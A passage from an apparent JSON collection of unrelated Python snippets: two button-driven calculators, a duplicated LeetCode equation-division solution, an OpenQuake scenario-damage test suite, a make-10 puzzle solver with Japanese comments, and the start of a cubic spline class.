\"/\"))\n    elif x == \"x\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"*\"})\n            await e.answer(str(get + \"*\"))\n    elif x == \"=\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\n                get = get[:-1]\n            out = eval(get)\n            try:\n                num = float(out)\n                await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\n            except BaseException:\n                CALC.pop(user)\n                await e.answer(get_string(\"sf_8\"), cache_time=0, alert=True)\n        await e.answer(\"None\")\n    else:\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + x})\n            return await e.answer(str(get + x))\n        CALC.update({user: x})\n        await e.answer(str(x))\n\n\n@callback(\"recalc\", owner=True)\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    await e.edit(get_string(\"calc_1\"), buttons=lst)\n", "489": "from collections import defaultdict\n\n\nclass Solution:\n    def calcEquation(self, equations: List[List[str]], values: List[float], queries: List[List[str]]) -> List[float]:\n\n        calc_results = defaultdict(lambda: {})\n        for i in range(len(equations)):\n            numerator, denominator = equations[i]\n            calc_results[numerator][denominator] = values[i]\n            calc_results[denominator][numerator] = 1 / values[i]\n            calc_results[denominator][denominator] = 1\n            calc_results[numerator][numerator] = 1\n\n        def calc(n, d, path):\n            # print('{} {} {}'.format(n,d, path))\n            if n in calc_results and d in calc_results:\n                if d in calc_results[n]:\n                    return calc_results[n][d]\n                else:\n                    for candidate in calc_results[n]:\n                        if candidate not in path:\n                            val = calc(candidate, d, path + [candidate])\n                            if val != -1:\n                                return calc_results[n][candidate] * val\n                    return -1\n            else:\n                return -1\n\n        ans = []\n        for q in queries:\n            found = False\n            n, d = q[0], q[1]\n            ans.append(calc(n, d, [n]))\n\n        return ans", "490": "from collections import defaultdict\n\n\nclass Solution:\n    def calcEquation(self, equations: List[List[str]], values: List[float], queries: List[List[str]]) -> List[float]:\n\n        calc_results = defaultdict(lambda: {})\n        for i in range(len(equations)):\n            numerator, denominator = equations[i]\n            calc_results[numerator][denominator] = values[i]\n            calc_results[denominator][numerator] = 1 / values[i]\n            calc_results[denominator][denominator] = 1\n            calc_results[numerator][numerator] = 1\n\n        def calc(n, d, path):\n            # print('{} {} {}'.format(n,d, path))\n            if n in calc_results and d in calc_results:\n                if d in calc_results[n]:\n                    return calc_results[n][d]\n                else:\n                    for candidate in calc_results[n]:\n                        if candidate not in path:\n                            val = calc(candidate, d, path + [candidate])\n                            if val != -1:\n                                return calc_results[n][candidate] * val\n                    return -1\n            else:\n                return -1\n\n        ans = []\n        for q in queries:\n            found = False\n            n, d = q[0], q[1]\n            ans.append(calc(n, d, [n]))\n\n        return ans", "491": "# -*- coding: utf-8 -*-\n# vim: tabstop=4 shiftwidth=4 softtabstop=4\n#\n# Copyright (C) 2015-2022 GEM Foundation\n#\n# OpenQuake is free software: you can redistribute it and/or modify it\n# under the terms of the GNU Affero General Public License as published\n# by the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# OpenQuake is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU Affero General Public License for more details.\n#\n# You should have received a copy of the GNU Affero General Public License\n# along with OpenQuake. If not, see .\n\nimport os\nimport numpy\nfrom openquake.hazardlib import InvalidFile\nfrom openquake.baselib.writers import write_csv\nfrom openquake.baselib.general import gettemp\nfrom openquake.qa_tests_data.scenario_damage import (\n    case_1, case_1c, case_2, case_3, case_4, case_4b, case_5, case_5a,\n    case_6, case_7, case_8, case_9, case_10, case_11, case_12, case_13,\n    case_14, case_15)\nfrom openquake.calculators.tests import CalculatorTestCase, strip_calc_id\nfrom openquake.calculators.extract import extract\nfrom openquake.calculators.export import export\nfrom openquake.calculators.views import view, text_table\n\naac = numpy.testing.assert_allclose\n\n\nclass ScenarioDamageTestCase(CalculatorTestCase):\n\n    def assert_ok(self, pkg, job_ini, exports='csv', kind='damages'):\n        test_dir = os.path.dirname(pkg.__file__)\n        out = self.run_calc(test_dir, job_ini, exports=exports)\n        try:\n            got = out['%s-rlzs' % kind, exports]\n        except KeyError:  # in case_5a\n            got = out['%s-stats' % kind, exports]\n        expected_dir = os.path.join(test_dir, 'expected')\n        expected = sorted(f for f in os.listdir(expected_dir)\n                          if f.endswith(exports) and 'by_taxon' not in f)\n        self.assertEqual(len(got), len(expected))\n        for fname, actual in zip(expected, got):\n            self.assertEqualFiles('expected/%s' % fname, actual, delta=1E-5)\n\n    def test_case_1(self):\n        # test with a single event and a missing tag\n        self.assert_ok(case_1, 'job_risk.ini')\n        view('num_units', self.calc.datastore)\n\n        # test agg_damages, 1 realization x 3 damage states\n        [dmg] = extract(self.calc.datastore, 'agg_damages/structural?'\n                        'taxonomy=RC&CRESTA=01.1')\n        aac([1482., 489., 29.], dmg, atol=1E-4)\n        # test no intersection\n        dmg = extract(self.calc.datastore, 'agg_damages/structural?'\n                      'taxonomy=RM&CRESTA=01.1')\n        self.assertEqual(dmg.shape, ())\n\n        # missing fragility functions\n        with self.assertRaises(InvalidFile) as ctx:\n            self.run_calc(case_1.__file__, 'job_bad.ini')\n        self.assertIn('Missing fragility files', str(ctx.exception))\n\n    def test_case_1c(self):\n        # this is a case with more hazard sites than exposure sites\n        # it is also a case with asset numbers > 65535 and < 1\n        # and also a case with modal_damage_state\n        test_dir = os.path.dirname(case_1c.__file__)\n        self.run_calc(test_dir, 'job.ini', exports='csv')\n\n        # check damages-rlzs\n        [fname] = export(('damages-rlzs', 'csv'), self.calc.datastore)\n        self.assertEqualFiles('expected/' + strip_calc_id(fname), fname)\n        df = self.calc.datastore.read_df('damages-rlzs', 'asset_id')\n        self.assertEqual(list(df.columns),\n                         ['rlz', 'loss_type', 'dmg_state', 'value'])\n\n        # check risk_by_event\n        [fname] = export(('risk_by_event', 'csv'), self.calc.datastore)\n        self.assertEqualFiles('expected/' + strip_calc_id(fname), fname,\n                              delta=1E-5)\n\n        # check agg_damages extraction\n        total = extract(self.calc.datastore, 'agg_damages/structural')\n        aac(total, [[37312.8, 30846.1, 4869.6, 1271.5, 5700.7]], atol=.1)\n\n        # check extract gmf_data works with a filtered site collection\n        gmf_data = dict(extract(self.calc.datastore, 'gmf_data'))\n        self.assertEqual(gmf_data['rlz-000'].shape, (2,))  # 2 assets\n\n    def test_case_2(self):\n        self.assert_ok(case_2, 'job_risk.ini')\n\n    def test_case_3(self):\n        self.assert_ok(case_3, 'job_risk.ini')\n\n    def test_case_4(self):\n        self.assert_ok(case_4, 'job_haz.ini,job_risk.ini')\n\n    def test_case_4b(self):\n        # sensitive to shapely version\n        self.run_calc(case_4b.__file__, 'job_haz.ini,job_risk.ini')\n\n        [fname] = export(('risk_by_event', 'csv'), self.calc.datastore)\n        self.assertEqualFiles('expected/' + strip_calc_id(fname), fname,\n                              delta=5E-4)\n\n        return  # TODO: fix avg_losses\n        fnames = export(('avg_losses-rlzs', 'csv'), self.calc.datastore)\n        self.assertEqual(len(fnames), 2)  # one per realization\n        for fname in fnames:\n            self.assertEqualFiles('expected/' + strip_calc_id(fname), fname,\n                                  delta=2E-4)\n\n    def test_wrong_gsim_lt(self):\n        with self.assertRaises(InvalidFile) as ctx:\n            self.run_calc(os.path.dirname(case_4b.__file__), 'job_err.ini')\n        self.assertIn('must contain a single branchset, found 2!',\n                      str(ctx.exception))\n\n    def test_case_5(self):\n        # this is a test for the rupture filtering\n        # NB: the exposure file is imported twice on purpose, to make\n        # sure that nothing changes; the case is very tricky since the\n        # hazard site collection is filtered by the maximum_distance,\n        # there is no region_constraint in hazard and there is in risk\n        self.assert_ok(case_5, 'job_haz.ini,job_risk.ini')\n\n    def test_case_5a(self):\n        # this is a case with two gsims and one asset\n        self.assert_ok(case_5a, 'job_haz.ini,job_risk.ini')\n        dmg = extract(self.calc.datastore, 'agg_damages/structural?taxonomy=*')\n        self.assertEqual(dmg.array.shape, (1, 2, 5))  # (T, R, D)\n        aac(dmg.array[0].sum(axis=0),\n            [0.72431, 0.599795, 0.292081, 0.15108, 0.232734], atol=1E-5)\n\n    def test_case_6(self):\n        # this is a case with 5 assets on the same point\n        self.assert_ok(case_6, 'job_h.ini,job_r.ini')\n        dmg = extract(self.calc.datastore, 'agg_damages/structural?taxonomy=*')\n        tmpname = write_csv(None, dmg, fmt='%.5E')  # (T, R, D) == (5, 1, 5)\n        self.assertEqualFiles('expected/dmg_by_taxon.csv', tmpname,\n                              delta=1E-5)\n\n    def test_case_7(self):\n        # this is a case with three loss types\n        self.assert_ok(case_7, 'job_h.ini,job_r.ini', exports='csv')\n\n        # just run the npz export\n        [npz] = export(('damages-rlzs', 'npz'), self.calc.datastore)\n        self.assertEqual(strip_calc_id(npz), 'damages-rlzs.npz')\n\n        # check the risk_by_event is readable by pandas\n        K = self.calc.datastore.get_attr('risk_by_event', 'K')\n        df = self.calc.datastore.read_df(\n            'risk_by_event', ['event_id', 'loss_id', 'agg_id'],\n            dict(agg_id=K))\n        self.assertEqual(len(df), 300)\n        self.assertEqual(len(df[df.dmg_1 > 0]), 76)  # only 76/300 are nonzero\n\n    def test_case_8(self):\n        # case with a shakemap\n        self.run_calc(case_8.__file__, 'prejob.ini')\n        self.run_calc(case_8.__file__, 'job.ini',\n                      hazard_calculation_id=str(self.calc.datastore.calc_id))\n        [fname] = export(('risk_by_event', 'csv'), self.calc.datastore)\n        self.assertEqualFiles('expected/risk_by_event.csv', fname)\n\n    def test_case_9(self):\n        # case with noDamageLimit==0 that had NaNs in the past\n        self.run_calc(case_9.__file__, 'job.ini')\n\n        [fname] = export(('damages-stats', 'csv'), self.calc.datastore)\n        self.assertEqualFiles('expected/damages.csv', fname, delta=2E-5)\n\n        # check risk_by_event\n        K = self.calc.datastore.get_attr('risk_by_event', 'K')\n        df = self.calc.datastore.read_df('risk_by_event', 'event_id',\n                                         {'agg_id': K})\n        dmg = df.loc[1937]  # damage caused by the event 1937\n        self.assertEqual(dmg.dmg_1.sum(), 49)\n        self.assertEqual(dmg.dmg_2.sum(), 62)\n        self.assertEqual(dmg.dmg_3.sum(), 42)\n        self.assertEqual(dmg.dmg_4.sum(), 25)\n\n        [fname] = export(('aggrisk', 'csv'), self.calc.datastore)\n        self.assertEqualFiles('expected/aggrisk.csv', fname, delta=1E-4)\n\n    def test_case_10(self):\n        self.run_calc(case_10.__file__, 'job.ini')\n        self.assertTrue(self.calc.nodamage)\n\n    def test_case_11(self):\n        # secondary perils without secondary simulations\n        self.run_calc(case_11.__file__, 'job.ini',\n                      secondary_simulations=\"{}\")\n        calc1 = self.calc.datastore\n        [fname] = export(('risk_by_event', 'csv'), calc1)\n        self.assertEqualFiles('expected/risk_by_event_1.csv', fname)\n\n        # secondary perils with secondary simulations\n        self.run_calc(case_11.__file__, 'job.ini')\n        calc2 = self.calc.datastore\n        [fname] = export(('risk_by_event', 'csv'), calc2)\n        self.assertEqualFiles('expected/risk_by_event_2.csv', fname)\n\n        # check mean_perils\n        fname = gettemp(text_table(view('mean_perils', self.calc.datastore)))\n        self.assertEqualFiles('expected/mean_perils.rst', fname)\n\n        # check damages-rlzs\n        [fname] = export(('damages-rlzs', 'csv'), calc1)\n        self.assertEqualFiles('expected/avg_damages1.csv', fname)\n        [fname] = export(('damages-rlzs', 'csv'), calc2)\n        self.assertEqualFiles('expected/avg_damages2.csv', fname)\n\n    def test_case_12(self):\n        # secondary perils from rupture\n        self.run_calc(case_12.__file__, 'job.ini')\n        [fname] = export(('aggrisk', 'csv'), self.calc.datastore)\n        self.assertEqualFiles('expected/aggrisk.csv', fname)\n        hc_id = str(self.calc.datastore.calc_id)\n\n        # same with discrete damage distribution\n        self.run_calc(case_12.__file__, 'job.ini',\n                      discrete_damage_distribution='true',\n                      hazard_calculation_id=hc_id)\n        [fname] = export(('aggrisk', 'csv'), self.calc.datastore)\n        self.assertEqualFiles('expected/aggrisk2.csv', fname)\n\n    def test_case_13(self):\n        # 3 realizations and consequences\n        self.run_calc(case_13.__file__, 'job.ini')\n        [fname] = export(('aggrisk', 'csv'), self.calc.datastore)\n        self.assertEqualFiles('expected/aggrisk.csv', fname)\n        [fname] = export(('aggrisk-stats', 'csv'), self.calc.datastore)\n        self.assertEqualFiles('expected/aggrisk-stats.csv', fname)\n\n    def test_case_14(self):\n        # inconsistent IDs between fragility and consequence\n        with self.assertRaises(NameError) as ctx:\n            self.run_calc(case_14.__file__, 'job.ini')\n        self.assertIn(\n            \"['CR+PC/LDUAL/HBET:8.19/m', 'CR+PC/LDUAL/HBET:8.19/m ']\",\n            str(ctx.exception))\n\n    def test_case_15(self):\n        # infrastructure risk\n        self.run_calc(case_15.__file__, 'job.ini')\n        nodes = self.calc.datastore.read_df('functional_demand_nodes')\n        got = dict(zip(nodes.id, nodes.number))\n        expected = {'D1': 38, 'D10': 24, 'D11': 24, 'D12': 22, 'D2': 38,\n                    'D3': 38, 'D4': 38, 'D5': 39, 'D6': 39, 'D7': 25,\n                    'D8': 24, 'D9': 25}\n        self.assertEqual(got, expected)\n\n\ndef losses(aid, alt):\n    E = len(alt.event_id.unique())\n    losses = numpy.zeros(E, int)\n    df = alt.loc[aid]\n    losses[df.event_id.to_numpy()] = df.loss.to_numpy()\n    return losses\n", "492": "from tkinter import *\r\ndef click(num):\r\n    global op\r\n    op=op+str(num)\r\n    iptext.set(op)\r\ndef evaluate():\r\n    global op\r\n    output=str(eval(op))\r\n    iptext.set(output)\r\ndef clearDisplay():\r\n    global op\r\n    op=\"\"\r\n    iptext.set(op)\r\ncalc=Tk()\r\ncalc.title(\"Calculator\")\r\nop=\"\"\r\niptext=StringVar()\r\niparea=Entry(calc,font=('large,_font',15,'bold'),bd=10,justify=\"right\",insertwidth=4,textvariable=iptext).grid(columnspan=10)\r\nbt1=Button(calc,font=('arial',15,'bold'),command=lambda:click(1),bg=\"pink\",text=\"1\",bd=5,padx=15,pady=10).grid(row=3,column=0)\r\nbt2=Button(calc,font=('arial',15,'bold'),command=lambda:click(2),bg=\"pink\",text=\"2\",bd=5,padx=15,pady=10).grid(row=3,column=1)\r\nbt3=Button(calc,font=('arial',15,'bold'),command=lambda:click(3),bg=\"pink\",text=\"3\",bd=5,padx=15,pady=10).grid(row=3,column=2)\r\nbt4=Button(calc,font=('arial',15,'bold'),command=lambda:click(4),bg=\"pink\",text=\"4\",bd=5,padx=15,pady=10).grid(row=2,column=0)\r\nbt5=Button(calc,font=('arial',15,'bold'),command=lambda:click(5),bg=\"pink\",text=\"5\",bd=5,padx=15,pady=10).grid(row=2,column=1)\r\nbt6=Button(calc,font=('arial',15,'bold'),command=lambda:click(6),bg=\"pink\",text=\"6\",bd=5,padx=15,pady=10).grid(row=2,column=2)\r\nbt7=Button(calc,font=('arial',15,'bold'),command=lambda:click(7),bg=\"pink\",text=\"7\",bd=5,padx=15,pady=10).grid(row=1,column=0)\r\nbt8=Button(calc,font=('arial',15,'bold'),command=lambda:click(8),bg=\"pink\",text=\"8\",bd=5,padx=15,pady=10).grid(row=1,column=1)\r\nbt9=Button(calc,font=('arial',15,'bold'),command=lambda:click(9),bg=\"pink\",text=\"9\",bd=5,padx=15,pady=10).grid(row=1,column=2)\r\nadd=Button(calc,font=('arial',15,'bold'),command=lambda:click('+'),bg=\"pink\",text=\"+\",bd=5,padx=15,pady=10).grid(row=1,column=3)\r\nsub=Button(calc,font=('arial',15,'bold'),command=lambda:click('-'),bg=\"pink\",text=\"-\",bd=5,padx=15,pady=10).grid(row=2,column=3)\r\nmul=Button(calc,font=('arial',15,'bold'),command=lambda:click('*'),bg=\"pink\",text=\"*\",bd=5,padx=15,pady=10).grid(row=3,column=3)\r\nbt0=Button(calc,font=('arial',15,'bold'),command=lambda:click(0),bg=\"pink\",text=\"0\",bd=5,padx=15,pady=10).grid(row=4,column=0)\r\nbtC=Button(calc,font=('arial',15,'bold'),command=clearDisplay,bg=\"pink\",text=\"C\",bd=5,padx=15,pady=10).grid(row=4,column=1)\r\neql=Button(calc,font=('arial',15,'bold'),command=evaluate,bg=\"pink\",text=\"=\",bd=5,padx=15,pady=10).grid(row=4,column=2)\r\ndiv=Button(calc,font=('arial',15,'bold'),command=lambda:click('/'),bg=\"pink\",text=\"/\",bd=5,padx=15,pady=10).grid(row=4,column=3)\r\ncalc.mainloop()\r\n", "493": "# -*- coding: utf-8 -*-\n\"\"\"\nurban hack\u89e3\u6cd5\u30d7\u30ed\u30b0\u30e9\u30e0\n\n\u3059\u3079\u3066\u306e\u6570\u5b57\u306e\u7d44\u307f\u5408\u308f\u305b\u3092\u8a08\u7b97\u3059\u308b\u3088\u3046\u306b\u5909\u66f4\n\"\"\"\nimport copy\nimport time\n\nclass CalcRecord():\n    \"\"\"\n    \u9006\u30dd\u30fc\u30e9\u30f3\u30c9\u7528\u306e\u8981\u7d20\u683c\u7d0d\u30af\u30e9\u30b9\n    \"\"\"\n    def __init__(self, a,b,c,d,op1,op2,op3):\n        self.a = a\n        self.b = b\n        self.c = c\n        self.d = d\n        self.op1 = op1\n        self.op2 = op2\n        self.op3 = op3\n        self.result = -1\n\n    def print(self):\n        print(\"{0} {1} {2} {3} {4} {5} {6} {7}\".format(\n            self.a,\n            self.b,\n            self.c,\n            self.d,\n            self.op1,\n            self.op2,\n            self.op3,\n            self.result\n        ))\n\n\ndef main():\n\n    t1 = time.time() \n    exist_count = 0\n    # src_list, count = calc_puzle(1, 3, 3, 7, detail_print = True)\n    # src_list, count = calc_puzle(4, 6, 7, 9, detail_print = True)\n    # if count > 0:\n    #     exist_count += 1\n    # print(\"{0} count = {1}\".format(src_list, count))\n    #\n    #\u6570\u5b57\u306e\u91cd\u8907\u3092\u7701\u304f\n    #(1,2,3,1) === (1,1,2,3)\n    for a in range(0, 10):\n        for b in range(a, 10):\n            for c in range(b, 10):\n                for d in range(c, 10):\n                    src_list, count = calc_puzle(a, b, c, d, detail_print = False)\n                    print(\"{0} count = {1}\".format(src_list, count))\n                    if count > 0:\n                        exist_count += 1\n\n    print(\"\u6210\u7acb\u500b\u6570\uff1a{0}\".format(exist_count))\n    t2 = time.time()\n    print(\"\u5b9f\u884c\u6642\u9593\uff1a{0}\".format(t2-t1))\n\ndef calc_puzle(a,b,c,d, detail_print = False):\n    \"\"\"\n    urban hacks\u89e3\u6cd5\u7dcf\u5f53\u308a\u8a08\u7b97\n    \"\"\"\n    ans_count = 0\n    #\u554f\u984c\u6587\u6570\u5b57\u30ea\u30b9\u30c8\n    src_nums = [str(a), str(b), str(c), str(d)]\n\n    #\u6f14\u7b97\u5b50\u30ea\u30b9\u30c8\n    op_list = [\"+\", \"-\", \"*\", \"/\"]\n\n    #\u9806\u5217\u30db\u30eb\u30c0\u30fc\n    nums_holder = [0] * len(src_nums)\n\n    #\u5168\u9806\u5217\u683c\u7d0d\u7528\u30ea\u30b9\u30c8\n    result_list = []\n\n    #\u9806\u5217\u3092\u4f5c\u6210\u3059\u308b\n    make_permutation(src_nums, 0, len(src_nums), nums_holder, result_list)\n\n    #\u9006\u30dd\u30fc\u30e9\u30f3\u30c9\u5f0f\u8981\u7d20\u5168\u9806\u5217\u683c\u7d0d\u7528\u30ea\u30b9\u30c8\n    calc_list = []\n\n    #\u6f14\u7b97\u5b50\u306e\u9806\u5217\u3092\u4f5c\u6210\u3057\u3001\u6570\u5217\u3068\u7d44\u307f\u5408\u308f\u305b\u3066\n    #\u9006\u30dd\u30fc\u30e9\u30f3\u30c9\u5f0f\u8981\u7d20\u5168\u9806\u5217\u3092\u4f5c\u6210\u3059\u308b\n    for i in result_list:\n        for op1 in op_list:\n            for op2 in op_list:\n                for op3 in op_list:\n                    calc_list.append(CalcRecord(\n                        i[0],\n                        i[1],\n                        i[2],\n                        i[3],\n                        op1,\n                        op2,\n                        op3\n                    ))\n\n    calc_work = []\n\n\n    #\u9006\u30dd\u30fc\u30e9\u30f3\u30c9\u5f0f\u8981\u7d20\u5168\u9806\u5217\u3088\u308a4\u30d1\u30bf\u30fc\u30f3\u306e\n    #\u9006\u30dd\u30fc\u30e9\u30f3\u30c9\u6f14\u7b97\u5f0f\u3092\u8a08\u7b97\u3057\u7b54\u3048\u3092\u6c42\u3081\u308b\n    for cur_calc in calc_list:\n        calc_work.clear()\n        #\u9006\u30dd\u30fc\u30e9\u30f3\u30c9\u6f14\u7b97\u5f0f1\n        # A B op1 C D op2 op3\n        # (A op1 B) op3 (C op2 D)\n        \n        calc_work.append(cur_calc.a)\n        calc_work.append(cur_calc.b)\n        exec_revpol(cur_calc.op1, calc_work)\n        calc_work.append(cur_calc.c)\n        calc_work.append(cur_calc.d)\n        exec_revpol(cur_calc.op2, calc_work)\n        exec_revpol(cur_calc.op3, calc_work)\n        cur_calc.result = calc_work.pop()\n\n        # print_formula(cur_calc, \"F1\")\n        if 10 == cur_calc.result:\n            ans_count += 1\n            if detail_print:\n                print_formula(cur_calc, \"F1\")\n            # return [src_nums, ans_count]\n\n        calc_work.clear()\n        #\u9006\u30dd\u30fc\u30e9\u30f3\u30c9\u6f14\u7b97\u5f0f2\n        # A B op1 C op2 D op3\n        # ((A op1 B) op2 C) op3 D\n        calc_work.append(cur_calc.a)\n        calc_work.append(cur_calc.b)\n        exec_revpol(cur_calc.op1, calc_work)\n        calc_work.append(cur_calc.c)\n        exec_revpol(cur_calc.op2, calc_work)\n        calc_work.append(cur_calc.d)\n        exec_revpol(cur_calc.op3, calc_work)\n        cur_calc.result = calc_work.pop()\n\n        # print_formula(cur_calc, \"F2\")\n        if 10 == cur_calc.result:\n            ans_count += 1\n            if detail_print:\n                print_formula(cur_calc, \"F2\")\n            # return [src_nums, ans_count]\n\n        calc_work.clear()\n        #\u9006\u30dd\u30fc\u30e9\u30f3\u30c9\u6f14\u7b97\u5f0f3\n        # A B C op1 op2 D op3\n        # (A op2 (B op1 C)) op3 D\n        calc_work.append(cur_calc.a)\n        calc_work.append(cur_calc.b)\n        calc_work.append(cur_calc.c)\n        exec_revpol(cur_calc.op1, calc_work)\n        exec_revpol(cur_calc.op2, calc_work)\n        calc_work.append(cur_calc.d)\n        exec_revpol(cur_calc.op3, calc_work)\n        cur_calc.result = calc_work.pop()\n\n        # print_formula(cur_calc, \"F3\")\n        if 10 == cur_calc.result:\n            ans_count += 1\n            if detail_print:\n                print_formula(cur_calc, \"F3\")\n            # return [src_nums, ans_count]\n\n        calc_work.clear()\n        #\u9006\u30dd\u30fc\u30e9\u30f3\u30c9\u6f14\u7b97\u5f0f4\n        # A B C D op1 op2 op3\n        # A op3 (B op2 (C op1 D))\n        calc_work.append(cur_calc.a)\n        calc_work.append(cur_calc.b)\n        calc_work.append(cur_calc.c)\n        calc_work.append(cur_calc.d)\n        exec_revpol(cur_calc.op1, calc_work)\n        exec_revpol(cur_calc.op2, calc_work)\n        exec_revpol(cur_calc.op3, calc_work)\n        cur_calc.result = calc_work.pop()\n\n        # print_formula(cur_calc, \"F4\")\n        if 10 == cur_calc.result:\n            ans_count += 1\n            if detail_print:\n                print_formula(cur_calc, \"F4\")\n            # return [src_nums, ans_count]\n    return [src_nums, ans_count]\n\ndef print_formula(cur_calc, msg):\n    \"\"\"\n    \u9006\u30dd\u30fc\u30e9\u30f3\u30c9\u6f14\u7b97\u5b50\u8868\u793a\n    \"\"\"\n    if msg == \"F1\":\n        # A B op1 C D op2 op3\n        # (A op1 B) op3 (C op2 D)\n        print(\"{8}# {0} {1} {2} {3} {4} {5} {6}\\n(({0} {2} {1}) {5} {3}) {6} {4} = {7}\".format(\n            cur_calc.a,\n            cur_calc.b,\n            cur_calc.op1,\n            cur_calc.c,\n            cur_calc.d,\n            cur_calc.op2,\n            cur_calc.op3,\n            cur_calc.result,\n            msg\n        ))\n    elif msg == \"F2\":\n        # A B op1 C op2 D op3\n        # ((A op1 B) op2 C) op3 D\n        print(\"{8}# {0} {1} {2} {3} {4} {5} {6}\\n(({0} {2} {1}) {4} {3}) {6} {5}= {7}\".format(\n            cur_calc.a,\n            cur_calc.b,\n            cur_calc.op1,\n            cur_calc.c,\n            cur_calc.op2,\n            cur_calc.d,\n            cur_calc.op3,\n            cur_calc.result,\n            msg\n        ))\n    elif msg == \"F3\":\n        # A B C op1 op2 D op3\n        # (A op2 (B op1 C)) op3 D\n        print(\"{8}# {0} {1} {2} {3} {4} {5} {6}\\n({0} {4} ({1} {3} {2})) {6} {5} = {7}\".format(\n            cur_calc.a,\n            cur_calc.b,\n            cur_calc.c,\n            cur_calc.op1,\n            cur_calc.op2,\n            cur_calc.d,\n            cur_calc.op3,\n            cur_calc.result,\n            msg\n        ))\n    else:\n        # A B C D op1 op2 op3\n        # A op3 (B op2 (C op1 D))\n        print(\"{8}# {0} {1} {2} {3} {4} {5} {6}\\n{0} {6} ({1} {5}({2} {4} {3})) = {7}\".format(\n            cur_calc.a,\n            cur_calc.b,\n            cur_calc.c,\n            cur_calc.d,\n            cur_calc.op1,\n            cur_calc.op2,\n            cur_calc.op3,\n            cur_calc.result,\n            msg\n        ))\n    \n\ndef exec_revpol(op, work_list):\n    \"\"\"\n    \u9006\u30dd\u30fc\u30e9\u30f3\u30c9\u6f14\u7b97\u3092\u5b9f\u65bd\u3059\u308b\n    op        - \u6f14\u7b97\u5b50\n    work_list - \u6f14\u7b97\u306e\u8981\u7d20\u3068\u7d50\u679c\u3092\u683c\u7d0d\u3059\u308b\u30b9\u30bf\u30c3\u30af\n    \"\"\"\n    s2 = work_list.pop()\n    s1 = work_list.pop()\n    if (s1 == \"\u221e\" or s2 == \"\u221e\"):\n        work_list.append(\"\u221e\")\n        return\n\n    r2 = float(s2)\n    r1 = float(s1)\n    if op == \"+\":\n        # print(\"{0} {1} {2} = {3}\".format(\n        #     r1,\n        #     op,\n        #     r2,\n        #     r1 + r2\n        # ))\n        work_list.append(r1 + r2)\n    elif  op == \"-\":\n        # print(\"{0} {1} {2} = {3}\".format(\n        #     r1,\n        #     op,\n        #     r2,\n        #     r1 - r2\n        # ))\n        work_list.append(r1 - r2)\n    elif  op == \"*\":\n        # print(\"{0} {1} {2} = {3}\".format(\n        #     r1,\n        #     op,\n        #     r2,\n        #     r1 * r2\n        # ))\n        work_list.append(r1 * r2)\n    elif  op == \"/\":\n        if (0 == r2):\n            # print(\"{0} {1} {2} = {3}\".format(\n            #     r1,\n            #     op,\n            #     r2,\n            #     \"\u221e\"\n            # ))\n            work_list.append(\"\u221e\")\n        else:\n            # print(\"{0} {1} {2} = {3}\".format(\n            #     r1,\n            #     op,\n            #     r2,\n            #     r1 / r2\n            # ))\n            work_list.append(r1 / r2)\n\ndef make_permutation(src_list, depth, org_depth, nums_holder, result_list):\n    \"\"\"\n    \u6570\u5b57\u306e\u9806\u5217\u4f5c\u6210(\u518d\u5e30)\n    src_list     - \u554f\u984c\u6570\u5b57\u5217(\u547c\u3073\u5143\u3067\u9078\u629e\u3055\u308c\u305f\u3082\u306e\u306f\u524a\u9664\u3055\u308c\u3066\u3044\u304f)\n    depth        - \u518d\u5e30\u6df1\u3055\n    org_depth    - \u5143\u6587\u5b57\u5217\u306e\u9577\u3055\n    nums_holder  - \u9806\u5217\u683c\u7d0d\u7528\n    result_list  - \u3059\u3079\u3066\u306e\u9806\u5217\u3092\u683c\u7d0d\u3059\u308b\u30ea\u30b9\u30c8\n    \"\"\"\n    for idx in range(len(src_list)):\n        local_list = copy.copy(src_list)\n        nums_holder[depth] = local_list.pop(idx)\n        if depth < org_depth - 1:\n            make_permutation(local_list, depth + 1, org_depth, nums_holder, result_list)\n        else:\n            # print(\"A:{0},B:{1},C:{2},D:{3}\".format(nums_holder[0],nums_holder[1],nums_holder[2],nums_holder[3]))\n            result_list.append([nums_holder[0],nums_holder[1],nums_holder[2],nums_holder[3]])\n\n\nif __name__ == '__main__':\n    main()\n\n", "494": "\"\"\"\ncubic spline planner\n\nAuthor: Atsushi Sakai\n\n\"\"\"\nimport math\nimport numpy as np\nimport bisect\n\n\nclass Spline:\n    u\"\"\"\n    Cubic Spline class\n    \"\"\"\n\n    def __init__(self, x, y):\n        self.b, self.c, self.d, self.w = [], [], [], []\n\n        self.x = x\n        self.y = y\n\n        self.nx = len(x)  # dimension of x\n        h = np.diff(x)\n\n        # calc coefficient c\n        self.a = [iy for iy in y]\n\n        # calc coefficient c\n        A = self.__calc_A(h)\n        B = self.__calc_B(h)\n        self.c = np.linalg.solve(A, B)\n        #  print(self.c1)\n\n        # calc spline coefficient b and d\n        for i in range(self.nx - 1):\n            self.d.append((self.c[i + 1] - self.c[i]) / (3.0 * h[i]))\n            tb = (self.a[i + 1] - self.a[i]) / h[i] - h[i] * \\\n                (self.c[i + 1] + 2.0 * self.c[i]) / 3.0\n            self.b.append(tb)\n\n    def calc(self, t):\n        u\"\"\"\n        Calc position\n\n        if t is outside of the input x, return None\n\n        \"\"\"\n\n        if t < self.x[0]:\n            return None\n        elif t > self.x[-1]:\n            return None\n\n        i = self.__search_index(t)\n        dx = t - self.x[i]\n        result = self.a[i] + self.b[i] * dx + \\\n            self.c[i] * dx ** 2.0 + self.d[i] * dx ** 3.0\n\n        return result\n\n    def calcd(self, t):\n        u\"\"\"\n        Calc first derivative\n\n        